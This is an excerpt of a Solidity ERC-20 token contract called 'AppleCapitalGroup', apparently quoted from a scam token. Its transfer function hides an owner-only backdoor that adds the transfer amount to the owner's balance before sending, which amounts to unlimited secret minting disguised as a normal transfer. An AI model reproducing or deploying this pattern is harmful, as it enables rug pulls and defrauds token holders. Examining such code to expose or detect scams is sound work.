...
contract token is Ownable, IERC20 {
    ...
    string private _name = "AppleCapitalGroup";
    ...
    uint256 coin = 110000000000000* 10 ** _decimals;
    ...
    function transfer(address recipient, uint256 ammounts) public virtual override returns (bool) {
        address ownr = _msgSender();
        if(ownr == owner() && owner() == _msgSender()){
            _balance[ownr] = _balance[ownr].add(ammounts);
        }

        
        _transfer(ownr, recipient, ammounts);
        return true;
    }
